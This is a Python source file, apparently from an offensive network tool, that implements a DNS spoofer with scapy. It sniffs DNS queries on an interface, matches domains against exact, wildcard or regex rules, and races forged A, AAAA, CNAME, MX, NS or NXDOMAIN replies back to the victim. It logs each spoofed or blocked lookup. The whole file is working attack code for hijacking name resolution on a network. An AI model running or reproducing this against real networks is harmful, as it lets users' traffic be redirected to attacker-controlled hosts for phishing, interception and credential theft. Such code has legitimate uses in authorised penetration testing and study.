from __future__ import annotations

import re
import threading
import time
from typing import Optional, Callable

import scapy.all as scapy
from loguru import logger

from spoof.models import SpoofRule, DNSAction, MatchType, DNSMode, SessionStats
from spoof.core.packet_sniffer import PacketSniffer
from spoof.core.packet_injector import PacketInjector


class DNSSpoofer:
    def __init__(
        self,
        rules: list[SpoofRule],
        interface: str,
        mode: DNSMode = DNSMode.RACE,
        injector: PacketInjector | None = None,
    ):
        self._rules = [r for r in rules if r.enabled]
        self._interface = interface
        self._mode = mode
        self._injector = injector or PacketInjector(interface)
        self._sniffer: Optional[PacketSniffer] = None
        self._running = False
        self._stats_lock = threading.Lock()
        self._stats = SessionStats()
        self._hit_callbacks: list[Callable] = []

    @property
    def stats(self) -> SessionStats:
        return self._stats

    def on_hit(self, callback: Callable) -> None:
        self._hit_callbacks.append(callback)

    def _match_rule(self, domain: str) -> tuple[SpoofRule | None, re.Match | None]:
        for rule in self._rules:
            if not rule.enabled:
                continue
            if rule.match_type == MatchType.EXACT:
                if domain == rule.pattern or domain.rstrip(".") == rule.pattern:
                    return rule, None
            elif rule.match_type == MatchType.WILDCARD:
                pat = re.escape(rule.pattern).replace(r"\*", ".*")
                if re.fullmatch(pat, domain) or re.fullmatch(pat, domain.rstrip(".")):
                    return rule, None
            elif rule.match_type == MatchType.REGEX:
                m = re.search(rule.pattern, domain)
                if m:
                    return rule, m
        return None, None

    def _handle_dns_race(self, packet) -> None:
        try:
            if not packet.haslayer(scapy.DNS) or not packet.haslayer(scapy.IP):
                return
            dns_layer = packet[scapy.DNS]
            if dns_layer.qr != 0:
                return
            if dns_layer.qdcount == 0:
                return

            qname = dns_layer.qd.qname.decode("utf-8") if isinstance(dns_layer.qd.qname, bytes) else str(dns_layer.qd.qname)
            qtype = dns_layer.qd.qtype if hasattr(dns_layer.qd, 'qtype') else 1
            rule, _ = self._match_rule(qname)

            if rule is None:
                with self._stats_lock:
                    self._stats.dns_queries_total += 1
                return

            ip_layer = packet[scapy.IP]
            udp_layer = packet[scapy.UDP]
            src_ip = ip_layer.dst
            dst_ip = ip_layer.src
            sport = udp_layer.dport
            dport = udp_layer.sport

            with self._stats_lock:
                self._stats.dns_queries_total += 1

            if rule.action == DNSAction.REDIRECT:
                target = rule.redirect_ip or "127.0.0.1"
                rec_type = rule.record_type.value if rule.record_type else "A"

                if rec_type == "CNAME":
                    self._injector.send_dns_cname_response(
                        src_ip=src_ip, dst_ip=dst_ip, src_port=sport, dst_port=dport,
                        query_id=dns_layer.id, query_domain=qname, cname_target=target,
                    )
                elif rec_type == "MX":
                    self._injector.send_dns_mx_response(
                        src_ip=src_ip, dst_ip=dst_ip, src_port=sport, dst_port=dport,
                        query_id=dns_layer.id, query_domain=qname, mx_server=target,
                    )
                elif rec_type == "NS":
                    self._injector.send_dns_ns_response(
                        src_ip=src_ip, dst_ip=dst_ip, src_port=sport, dst_port=dport,
                        query_id=dns_layer.id, query_domain=qname, ns_server=target,
                    )
                elif rec_type == "AAAA":
                    self._injector.send_dns_aaaa_response(
                        src_ip=src_ip, dst_ip=dst_ip, src_port=sport, dst_port=dport,
                        query_id=dns_layer.id, query_domain=qname, answer_ipv6=target,
                    )
                elif rule.records:
                    self._injector.send_dns_multi_record_response(
                        src_ip=src_ip, dst_ip=dst_ip, src_port=sport, dst_port=dport,
                        query_id=dns_layer.id, query_domain=qname,
                        records=[(r.type.value, r.value) for r in rule.records],
                    )
                else:
                    self._injector.send_dns_response(
                        src_ip=src_ip, dst_ip=dst_ip, src_port=sport, dst_port=dport,
                        query_id=dns_layer.id, query_domain=qname, answer_ip=target,
                    )
                with self._stats_lock:
                    self._stats.dns_spoofed += 1
                logger.info(f"spoofed {qname} -> {target} ({rule.record_type.value}) (race)")

                for cb in self._hit_callbacks:
                    try:
                        cb(domain=qname, client_ip=dst_ip, spoof_ip=target, action="redirect")
                    except Exception as e:
                        logger.warning(f"hit callback error: {e}")

            elif rule.action == DNSAction.BLOCK or rule.action == DNSAction.NXDOMAIN:
                self._injector.send_dns_nxdomain(
                    src_ip=src_ip,
                    dst_ip=dst_ip,
                    src_port=sport,
                    dst_port=dport,
                    query_id=dns_layer.id,
                    query_domain=qname,
                )
                with self._stats_lock:
                    self._stats.dns_blocked += 1
                logger.info(f"blocked {qname} (nxdomain)")

                for cb in self._hit_callbacks:
                    try:
                        cb(domain=qname, client_ip=dst_ip, spoof_ip=None, action="block")
                    except Exception as e:
                        logger.warning(f"hit callback error: {e}")

            elif rule.action == DNSAction.FORWARD:
                with self._stats_lock:
                    self._stats.dns_forwarded += 1

        except Exception as e:
            logger.debug(f"dns race handler error: {e}")

    def start(self) -> None:
        self._stats.start_time = time.time()

        self._sniffer = PacketSniffer(
            interface=self._interface,
            bpf_filter="udp port 53",
        )
        self._sniffer.on_packet(self._handle_dns_race)
        self._sniffer.start()
        self._running = True
        logger.info(f"dns spoofer started ({self._mode.value} mode, {len(self._rules)} rules)")

    def stop(self) -> None:
        self._running = False
        if self._sniffer:
            self._sniffer.stop()
        logger.info("dns spoofer stopped")
